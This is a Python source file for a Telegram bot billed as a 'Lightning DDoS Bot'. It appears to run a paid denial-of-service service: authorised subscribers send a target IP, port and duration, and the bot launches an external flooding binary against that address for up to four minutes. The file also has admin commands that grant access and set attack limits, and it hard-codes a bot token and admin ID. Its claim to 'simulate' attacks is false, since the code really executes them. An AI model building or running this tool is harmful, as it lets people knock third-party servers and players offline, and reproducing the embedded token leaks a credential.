import telebot
import datetime
import os
import time
import logging
import re
from collections import defaultdict
import subprocess
from threading import Timer
import random

# Set up logging
logging.basicConfig(level=logging.INFO)

# Constants
MAX_ATTACK_DURATION = 240  # Maximum attack duration in seconds (4 minutes)
USER_ACCESS_FILE = "user_access.txt"
ATTACK_LOG_FILE = "attack_log.txt"
ADMIN_ID = ["6442837812"]  # Replace with your admin user ID

# Replace with your Telegram bot token
bot = telebot.TeleBot('7530938442:AAHWIPs-vEFSlIhthQzzRA0jXZ-G5GYszvA')

# Dictionary to store user access information (user_id: expiration_date)
user_access = {}

# Track active attacks
active_attacks = []

# Dictionary to store attack limits (user_id: max_attack_duration)
attack_limits = {}

# Rate limiting
user_command_count = defaultdict(int)
last_command_time = {}

# Ensure the access file exists
if not os.path.exists(USER_ACCESS_FILE):
    open(USER_ACCESS_FILE, "w").close()

# Load user access information from file
def load_user_access():
    try:
        with open(USER_ACCESS_FILE, "r") as file:
            access = {}
            for line in file:
                user_id, expiration = line.strip().split(",")
                access[user_id] = datetime.datetime.fromisoformat(expiration)
            return access
    except FileNotFoundError:
        return {}
    except ValueError as e:
        logging.error(f"Error loading user access file: {e}")
        return {}

# Save user access information to file
def save_user_access():
    temp_file = f"{USER_ACCESS_FILE}.tmp"
    try:
        with open(temp_file, "w") as file:
            for user_id, expiration in user_access.items():
                file.write(f"{user_id},{expiration.isoformat()}\n")
        os.replace(temp_file, USER_ACCESS_FILE)
    except Exception as e:
        logging.error(f"Error saving user access file: {e}")

# Log attack details
def log_attack(user_id, target, port, duration):
    try:
        with open(ATTACK_LOG_FILE, "a") as log_file:
            log_file.write(f"{datetime.datetime.now()}: User {user_id} attacked {target}:{port} for {duration} seconds.\n")
    except Exception as e:
        logging.error(f"Error logging attack: {e}")

# Validate IP address
def is_valid_ip(ip):
    return re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip) is not None

# Rate limiting
def is_rate_limited(user_id):
    now = datetime.datetime.now()
    if user_id in last_command_time and (now - last_command_time[user_id]) < datetime.timedelta(seconds=5):
        user_command_count[user_id] += 1
        if user_command_count[user_id] > 3:
            return True
    else:
        user_command_count[user_id] = 1
        last_command_time[user_id] = now
    return False

# Load access information on startup
user_access = load_user_access()

# Command: /start
@bot.message_handler(commands=['start'])
def start_command(message):
    logging.info("Start command received")
    welcome_message = """
    🌟 Welcome to the **Lightning DDoS Bot**! 🌟

   ⚡️ With this bot, you can:
    - Check your subscription status.
    - Simulate powerful attacks responsibly.
    - Manage access and commands efficiently.

    🚀 Use `/help` to see the available commands and get started!

    🛡️ For assistance, contact [@wtf_vai]

    **Note:** Unauthorized access is prohibited. Contact an admin if you need access.
    """
    bot.reply_to(message, welcome_message, parse_mode='Markdown')

# Command: /bgmi or /attack
@bot.message_handler(commands=['bgmi', 'attack'])
def handle_bgmi(message):
    logging.info("BGMI command received")
    global active_attacks
    user_id = str(message.from_user.id)

    # Check authorization
    if user_id not in user_access or user_access[user_id] < datetime.datetime.now():
        bot.reply_to(message, "❌ You are not authorized to use this bot or your access has expired. Please contact an admin.")
        return

    # Rate limiting check
    if is_rate_limited(user_id):
        bot.reply_to(message, "🚨 Too many requests!")
        return

    # Parse command: /bgmi <target> <port> <duration>
    command = message.text.split()
    if len(command) != 4 or not command[3].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/bgmi <target> <port> <duration>`", parse_mode='Markdown')
        return

    target, port, duration = command[1], command[2], int(command[3])

    # Validate IP address
    if not is_valid_ip(target):
        bot.reply_to(message, "❌ Invalid target IP! Please provide a valid IP address.")
        return

    # Validate port number
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        bot.reply_to(message, "❌ Invalid port! Please provide a port number between 1 and 65535.")
        return

    # Check attack duration limit
    if duration > MAX_ATTACK_DURATION:
        bot.reply_to(message, f"⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds.")
        return

    # Check current active attacks and ensure maximum 1 concurrent attack
    current_active = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
    if len(current_active) >= 1:
        bot.reply_to(message, "🚨 Maximum of 1 concurrent attack allowed. Please wait for the current attack to finish before launching a new one.")
        return

    # Log and record the attack
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    attack_info = {
        'user_id': user_id,
        'target': target,
        'port': port,
        'end_time': attack_end_time
    }
    active_attacks.append(attack_info)
    log_attack(user_id, target, port, duration)

    # Send initial attack deployed message (without countdown)
    msg = bot.send_message(
        message.chat.id,
        f"""
⚡️🔥 𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐄𝐏𝐋𝐎𝐘𝐄𝐃 🔥⚡️

👑 **Commander**: `{user_id}`
🎯 **Target Locked**: `{target}`
📡 **Port Engaged**: `{port}`
⏳ **Duration**: `{duration} seconds`
⚔️ **Weapon**: `BGMI Protocol`
🔥 **The wrath is unleashed. May the network shatter!** 🔥
        """,
        parse_mode='Markdown'
    )

    # Build the command to run your binary using default CPU settings
    full_command = f"./soulcracks {target} {port} {duration}"
    try:
        subprocess.Popen(full_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        logging.error(f"Subprocess error: {e}")
        bot.reply_to(message, "🚨 An error occurred while executing the attack command.")
        # Remove attack_info in case of error launching attack
        if attack_info in active_attacks:
            active_attacks.remove(attack_info)
        return

    # Schedule the final message after the attack duration (non-blocking)
    def send_final_message():
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=f"""
✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃 ✅**  
🎯 **Target**: `{target}`
📡 **Port**: `{port}`
⏳ **Duration**: `{duration} seconds`
🔥 **Attack finished successfully!** 🔥
                """,
                parse_mode='Markdown'
            )
        except Exception as e:
            logging.error(f"Failed to send final message: {e}")
        finally:
            # Remove this attack from active attacks once completed
            if attack_info in active_attacks:
                active_attacks.remove(attack_info)

    Timer(duration, send_final_message).start()

# Command: /when
@bot.message_handler(commands=['when'])
def when_command(message):
    logging.info("When command received")
    global active_attacks
    active_attacks = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]

    if not active_attacks:
        bot.reply_to(message, "No attacks are currently in progress.")
        return

    active_attack_message = "Current active attacks:\n"
    for attack in active_attacks:
        target = attack['target']
        port = attack['port']
        time_remaining = max((attack['end_time'] - datetime.datetime.now()).total_seconds(), 0)
        active_attack_message += f"🌐 Target: `{target}`, 📡 Port: `{port}`, ⏳ Remaining Time: {int(time_remaining)} seconds\n"

    bot.reply_to(message, active_attack_message)

# Command: /help
@bot.message_handler(commands=['help'])
def help_command(message):
    logging.info("Help command received")
    help_text = """
    🚀 **Available Commands:**
    - **/start** - 🎉 Get started with a warm welcome message!
    - **/help** - 📖 Discover all the amazing things this bot can do for you!
    - **/bgmi <target> <port> <duration>** - ⚡ Launch an attack.
    - **/when** - ⏳ Check the remaining time for current attacks.
    - **/grant <user_id> <days>** - Grant user access (Admin only).
    - **/revoke <user_id>** - Revoke user access (Admin only).
    - **/attack_limit <user_id> <max_duration>** - Set max attack duration (Admin only).
    - **/status** - Check your subscription status.
    - **/list_users** - List all users with access (Admin only).
    - **/backup** - Backup user access data (Admin only).
    - **/download_backup** - Download user data (Admin Only).
    
    📋 **Usage Notes:**
    - 🔄 Replace `<user_id>`, `<target>`, `<port>`, and `<duration>` with the appropriate values.
    - 📞 Need help? Contact an admin for permissions or support – they're here to assist!
    """.replace("_", "\\_").replace("*", "\\*").replace("[", "\\[").replace("]", "\\]").replace("`", "\\`")
    try:
        bot.reply_to(message, help_text, parse_mode='Markdown')
    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"Telegram API error: {e}")
        bot.reply_to(message, "🚨 An error occurred while processing your request. Please try again later.")

# Command: /grant <user_id> <days>
@bot.message_handler(commands=['grant'])
def grant_command(message):
    logging.info("Grant command received")
    if str(message.from_user.id) not in ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    # Parse the command
    command = message.text.split()
    if len(command) != 3 or not command[2].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/grant <user_id> <days>`")
        return

    user_id, days = command[1], int(command[2])

    # Set expiration date
    expiration_date = datetime.datetime.now() + datetime.timedelta(days=days)
    user_access[user_id] = expiration_date

    save_user_access()

    bot.reply_to(message, f"✅ User {user_id} granted access until {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}.")

# Command: /revoke <user_id>
@bot.message_handler(commands=['revoke'])
def revoke_command(message):
    logging.info("Revoke command received")
    if str(message.from_user.id) not in ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    # Parse the command
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Invalid format! Use: `/revoke <user_id>`")
        return

    user_id = command[1]

    # Revoke access
    if user_id in user_access:
        del user_access[user_id]
        save_user_access()
        bot.reply_to(message, f"✅ User {user_id} access has been revoked.")
    else:
        bot.reply_to(message, f"❌ User {user_id} does not have access.")

# Command: /attack_limit <user_id> <max_duration>
@bot.message_handler(commands=['attack_limit'])
def attack_limit_command(message):
    logging.info("Attack limit command received")
    if str(message.from_user.id) not in ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    # Parse the command
    command = message.text.split()
    if len(command) != 3 or not command[2].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/attack_limit <user_id> <max_duration>`")
        return

    user_id, max_duration = command[1], int(command[2])

    # Set attack limit
    attack_limits[user_id] = max_duration

    bot.reply_to(message, f"✅ User {user_id} can now launch attacks up to {max_duration} seconds.")

# Command: /status
@bot.message_handler(commands=['status'])
def status_command(message):
    logging.info("Status command received")
    user_id = str(message.from_user.id)
    if user_id in user_access:
        expiration = user_access[user_id]
        bot.reply_to(message, f"✅ Your access is valid until {expiration.strftime('%Y-%m-%d %H:%M:%S')}.")
    else:
        bot.reply_to(message, "❌ You do not have access. Contact an admin.")

# Command: /list_users
@bot.message_handler(commands=['list_users'])
def list_users_command(message):
    logging.info("List users command received")
    if str(message.from_user.id) not in ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    users = "\n".join([f"{user_id}: {expiration}" for user_id, expiration in user_access.items()])
    bot.reply_to(message, f"Users with access:\n{users}")

# Command: /backup
@bot.message_handler(commands=['backup'])
def backup_command(message):
    logging.info("Backup command received")
    if str(message.from_user.id) not in ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    with open("user_access_backup.txt", "w") as backup_file:
        for user_id, expiration in user_access.items():
            backup_file.write(f"{user_id},{expiration.isoformat()}\n")
    bot.reply_to(message, "✅ User access data has been backed up.")
    
# Command: /download_backup
@bot.message_handler(commands=['download_backup'])
def download_backup(message):
    if str(message.from_user.id) not in ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    with open("user_access_backup.txt", "rb") as backup_file:
        bot.send_document(message.chat.id, backup_file)
        
# Polling with retry logic
while True:
    try:
        bot.polling(none_stop=True, interval=0, allowed_updates=["message"])
    except Exception as e:
        logging.error(f"Polling error: {e}")
        time.sleep(5)
